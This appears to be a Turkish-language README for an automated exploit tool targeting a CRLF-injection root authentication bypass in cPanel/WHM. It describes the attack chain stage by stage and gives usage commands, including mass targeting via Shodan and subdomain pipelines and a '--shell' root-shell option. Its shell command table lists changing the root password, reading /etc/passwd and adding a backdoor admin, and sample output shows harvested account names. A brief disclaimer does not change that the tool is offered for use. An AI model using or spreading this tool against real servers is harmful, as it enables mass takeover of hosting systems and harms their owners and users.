<br />

<p align="center">
  <b>CVE-2026-41940</b> · cPanel & WHM CRLF Injection → Root Bypass<br />
  <sub>CVSS 10.0 · Tam Otomatik · Sıfır Bağımlılık</sub>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.6+-3776AB?logo=python&logoColor=white&style=flat-square" />
  <img src="https://img.shields.io/badge/Sürüm-1.0_Auto-orange?style=flat-square" />
  <img src="https://img.shields.io/badge/CVSS-10.0-red?style=flat-square" />
  <img src="https://img.shields.io/badge/Lisans-MIT-success?style=flat-square" />
  <img src="https://img.shields.io/badge/Arsenik-000?style=flat-square" />
</p>

---

**WHM Ghost**, cPanel/WHM sunucularında **CVE-2026-41940** kimlik doğrulama atlamasını 
**tam otomatik** olarak sömürür. Hedefi verin; 4 aşamalı exploit, keşif ve rapor 
kendiliğinden çalışır — başarılı olursa **root shell** hazırdır.  
Yalnızca **Python 3.6+** gerektirir, hiçbir harici paket kurulmaz.

---

## Zafiyet Detayı

`saveSession()` fonksiyonu, oturum dosyasını yazdıktan **sonra** filtreleme yapar.  
**Authorization: Basic** başlığına yerleştirilen CRLF karakterleri, oturum dosyasına 
`hasroot=1`, `tfa_verified=1` gibi yetki alanlarını enjekte eder.  
→ **Geçersiz parolayla dahi root erişimi sağlanır.**

**Etkilenen:** 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, 11.136.0.5 öncesi tüm yapılar.  
**Düzeltme:** `Session.pm` içinde filtreleme, yazma işleminden önce yapılmaya başlandı.

---

## Saldırı Zinciri

| Aşama | Eylem | Amaç |
|-------|--------|------|
| **Stage 0** | `/openid_connect/cpanelid` → 307 | Gerçek sunucu adını keşfet |
| **Stage 1** | `POST /login/?login_only=1` yanlış parola | Preauth oturum çerezi al |
| **Stage 2** | `GET /` + CRLF'li Authorization | Oturum dosyasına `hasroot=1` yaz |
| **Stage 3** | `GET /scripts2/listaccts` | Token-denied tuzağı → önbelleğe it |
| **Stage 4** | `GET /cpsess.../json-api/version` | Root erişimini doğrula |

---

## Kurulum

```bash
git clone https://github.com/arsenik/whm-ghost.git
cd whm-ghost
python3 whm_ghost.py -u https://hedef.com:2087
Kullanım
Parametre	Açıklama
-u, --url	Tek hedef URL
-l, --list	Hedef listesi dosyası
-t, --threads	İş parçacığı (varsayılan 10)
--timeout	İstek zaman aşımı (sn, varsayılan 15)
--shell	Başarılı exploit sonrası direkt root shell
-o, --output	Sonuçları JSON'a kaydet
--no-color	Renkleri kapat
Çalışma Senaryoları

# Tek hedef – tam otomatik
python3 whm_ghost.py -u https://panel.example.com:2087

# Başarılıysa root shell aç
python3 whm_ghost.py -u https://panel.example.com:2087 --shell

# Dosyadaki listeden toplu tarama + rapor
python3 whm_ghost.py -l sunucular.txt -t 20 -o rapor.json

# Pipeline ile canlı hedefler
subfinder -d example.com | httpx -p 2087 -silent | python3 whm_ghost.py -t 30

# Shodan entegrasyonu
shodan search --fields ip_str,port 'title:"WHM Login"' \
  | awk '{print "https://"$1":"$2}' | python3 whm_ghost.py

Canlı Ekran Görüntüsü

[14:23:10] [ℹ] Taranıyor: https://demo.cpanel.net:2087
[14:23:11] [▶] Stage 0 – Canonical host: server1
[14:23:11] [▶] Stage 1 – Preauth session alındı
[14:23:12] [▶] Stage 2 – CRLF enjeksiyonu başarılı
[14:23:12] [▶] Stage 3 – Propagasyon tetiklendi
[14:23:13] [▶] Stage 4 – Root doğrulandı ✅
[14:23:13] [☠] BAŞARILI! Sürüm: 11.102.0.34
[14:23:13] [✓] Keşif: 12 hesap

═══ WHM GHOST ═══
[1] https://demo.cpanel.net:2087
   Sürüm: 11.102.0.34  Hostname: server1.example.com
   Hesaplar: 12 adet
   Kullanıcılar: user1, user2, admin, test...
   API: https://demo.cpanel.net:2087/cpsess1234567890/json-api/version

Root Shell Komutları
Komut	İşlev
help	Komut listesi
accounts	cPanel hesaplarını listele
info	Sunucu bilgisi (hostname, disk, yük)
cat /etc/passwd	Dosya oku
exec id	Sistem komutu çalıştır
passwd YeniSifre	Root parolasını değiştir
addadmin user pass	Backdoor admin ekle
exit	Shell'den çık
Yasal Uyarı
Bu araç yalnızca yetkili penetrasyon testleri ve eğitim amaçlıdır.
İzinsiz kullanım yasadışıdır. Geliştirici (Arsenik) sorumluluk kabul etmez.

A




